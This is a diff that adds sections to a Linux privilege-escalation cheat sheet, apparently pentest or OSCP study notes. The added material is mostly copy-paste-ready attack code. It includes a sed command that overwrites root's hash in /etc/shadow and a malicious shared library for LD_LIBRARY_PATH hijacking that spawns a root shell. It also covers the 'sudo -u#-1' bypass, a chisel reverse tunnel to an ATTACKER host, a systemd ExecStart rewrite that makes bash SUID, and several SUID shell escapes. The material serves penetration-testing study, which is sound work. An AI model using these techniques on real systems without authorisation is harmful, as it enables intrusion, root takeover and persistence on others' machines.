@@ -202,6 +202,28 @@ su hacker
 
 **Reference:** https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-etc-passwd-file
 
+### 5b. Writable `/etc/shadow`
+
+**Explanation:** If `/etc/shadow` is writable (rarer than `/etc/passwd` but the same class of misconfiguration), replace root's password hash directly.
+
+**Detection:**
+```bash
+ls -la /etc/shadow
+```
+
+**Exploitation:**
+```bash
+# Generate a new hash
+openssl passwd -6 -salt xyz password123
+
+# Replace root's hash in /etc/shadow (second field, between first and second colons)
+# Use sed or manual edit — be careful not to corrupt the file format
+cp /etc/shadow /etc/shadow.bak
+sed -i 's|^root:[^:]*:|root:$6$xyz$<generated_hash>:|' /etc/shadow
+su root
+# password: password123
+```
+
 ---
 
 ## 6. Kernel Exploit Lookup Workflow
@@ -327,6 +349,32 @@ gcc -shared -fPIC -o /path/writable/missing_lib.so.6 libshared.c
 https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path
 https://book.hacktricks.xyz/linux-hardening/privilege-escalation#path-abuses
 
+### 7c-2. `LD_LIBRARY_PATH` hijacking (when sudo preserves it)
+
+**Explanation:** If `sudo -l` shows `env_keep+=LD_LIBRARY_PATH`, you can compile a malicious shared library and point `LD_LIBRARY_PATH` to its directory. When any allowed sudo command loads a shared library by name, it searches `LD_LIBRARY_PATH` first — loading your payload instead.
+
+**Detection:**
+```bash
+sudo -l    # look for: env_keep+=LD_LIBRARY_PATH
+ldd /path/to/allowed_binary    # identify library names it loads
+```
+
+**Exploitation:**
+```c
+// libcustom.c — named to match a real library the allowed binary loads (e.g. libcustom.so)
+#include <stdio.h>
+#include <stdlib.h>
+void _init() {
+    unsetenv("LD_LIBRARY_PATH");
+    setuid(0);
+    system("/bin/bash -p");
+}
+```
+```bash
+gcc -shared -fPIC -o /tmp/libcustom.so /tmp/libcustom.c -nostartfiles
+sudo LD_LIBRARY_PATH=/tmp <allowed_command>
+```
+
 ### 7d. Sudo version exploits (CVE-based, no valid sudo rule needed)
 
 **Explanation:** Distinct from `sudo -l` misconfiguration abuse — a vulnerable sudo *build itself* can grant root regardless of what rules are configured. Always check the version alongside kernel version during enumeration.
@@ -341,6 +389,7 @@ sudo -V | head -n1     # e.g. "Sudo version 1.9.5p1"
 |---|---|---|
 | CVE-2021-3156 ("Baron Samedit") | sudo < 1.9.5p2 | Heap-based buffer overflow via crafted argv[0]/command-line args; no valid `sudo -l` entry needed, just local sudo binary access |
 | CVE-2019-18634 | sudo < 1.8.26 with `pwfeedback` enabled | Stack buffer overflow when typing password with `pwfeedback` on (check `sudo -l` or `/etc/sudoers` for `pwfeedback`) |
+| CVE-2019-14287 | sudo < 1.8.28 | `sudo -l` shows `(ALL, !root) /bin/bash` or similar `!root` restriction; running `sudo -u#-1 /bin/bash` bypasses the restriction because `-1` wraps to UID 0 (root). No memory corruption, just a logic bug — instant root if the rule exists and sudo is old enough |
 
 **Exploitation (CVE-2021-3156 workflow):**
 ```bash
@@ -353,6 +402,60 @@ gcc exploit.c -o exploit    # or run the provided PoC script per its instruction
 **Reference:** https://nvd.nist.gov/vuln/detail/CVE-2021-3156
 https://github.com/blasty/CVE-2021-3156
 https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
+
+---
+
+## 7e. Internal Service Enumeration (local-only listeners)
+
+**Explanation:** Services bound to `127.0.0.1` or `::1` (database admin panels, debug endpoints, internal APIs) are invisible to external scans but reachable from a foothold. A local-only service with weak/no auth is a common OSCP privesc vector — identify it, port-forward it back, and exploit from your attack box.
+
+**Detection:**
+```bash
+ss -tlnp                    # TCP listening sockets with process info
+ss -ulnp                    # UDP
+netstat -tlnp 2>/dev/null   # legacy alternative
+```
+Look for services bound to `127.0.0.1:PORT` or `[::1]:PORT` that don't appear in your external nmap scan. Common finds: MySQL (3306), PostgreSQL (5432), MongoDB (27017), Redis (6379), web admin panels (8080/8443/9090), Docker API (2375).
+
+**Exploitation:**
+Port-forward back to your attack box and interact normally:
+```bash
+# SSH local forward (if you have SSH creds)
+ssh -L 8080:127.0.0.1:8080 user@target
+# then browse http://localhost:8080 from your attack box
+
+# chisel (no SSH needed)
+# attacker: chisel server --reverse -p 9999
+# target:   chisel client ATTACKER:9999 R:8080:127.0.0.1:8080
+```
+
+**Reference:** https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
+
+## 7f. Writable systemd Service / Timer Files
+
+**Explanation:** If a `.service` or `.timer` unit file under `/etc/systemd/system/` is writable by your user, modify `ExecStart` to run a malicious payload as root when the service restarts or the timer fires.
+
+**Detection:**
+```bash
+find /etc/systemd/system/ -writable -type f 2>/dev/null
+find /lib/systemd/system/ -writable -type f 2>/dev/null
+systemctl list-timers --all    # check active timers
+```
+
+**Exploitation:**
+```bash
+# Modify the service's ExecStart to plant a SUID shell
+# (backup original first if you need to preserve function)
+cat /etc/systemd/system/vuln.service
+# Edit ExecStart:
+echo -e '[Service]\nExecStart=/bin/bash -c "chmod +s /bin/bash"' > /etc/systemd/system/vuln.service
+systemctl daemon-reload
+systemctl restart vuln.service   # if you can restart it
+# or wait for the next timer trigger / reboot
+/bin/bash -p
+```
+
+**Reference:** https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-service-binaries
 
 ---
 
@@ -373,6 +476,9 @@ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
 | LD_PRELOAD | `sudo -l` (env_keep) | gtfobins.github.io |
 | Library hijack | `strace -f -e trace=open` | hacktricks.xyz |
 | Sudo version CVE | `sudo -V` | nvd.nist.gov (CVE-2021-3156) |
+| Internal service enum | `ss -tlnp`, `netstat -tlnp` | hacktricks.xyz |
+| Writable systemd units | `find /etc/systemd -writable` | hacktricks.xyz |
+| Sudo `!root` bypass | `sudo -l` (check for !root) + `sudo -V` | CVE-2019-14287 |
 
 ---
 
@@ -425,4 +531,33 @@ chmod +x pspy64
 3. Enumerate SUID/SGID + capabilities: `find / -perm -4000 -type f 2>/dev/null`, `find / -perm -2000 -type f 2>/dev/null`, `getcap -r / 2>/dev/null`.
 4. Cross-reference every binary found (sudo-runnable, SUID, or capability-holding) against **GTFOBins** (https://gtfobins.github.io) for a documented "Sudo"/"SUID"/"Capabilities" abuse function.
 5. Confirm and execute the documented technique for that binary (e.g. `sudo vim -c ':!/bin/sh'`).
+
+**Common SUID exploitation examples (copy-paste ready):**
+```bash
+# find (SUID)
+find . -exec /bin/bash -p \; -quit
+
+# vim/vi (SUID)
+vim -c ':!/bin/bash -p'
+
+# python/python3 (SUID)
+python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
+
+# nmap (old interactive mode, nmap < 5.21)
+nmap --interactive
+!sh
+
+# env (SUID)
+env /bin/bash -p
+
+# cp (SUID — copy /etc/passwd, modify, copy back)
+cp /etc/passwd /tmp/passwd.bak
+# edit /tmp/passwd.bak to add a root user, then:
+cp /tmp/passwd.bak /etc/passwd
+```
+
 6. Fall back to broader enumeration (LinPEAS/lse.sh/pspy, cron, writable services, PATH hijacking) only if sudo/SUID/capabilities don't pan out — kernel exploits are used last since they're noisy and can crash the target.
+
+---
+
+> **Cross-reference:** for MySQL/PostgreSQL UDF privilege escalation (gaining root via a database running as root), see [`service-enumeration-comprehensive.md`](service-enumeration-comprehensive.md) — MySQL UDF (raptor_udf2) and PostgreSQL `COPY FROM PROGRAM` sections.
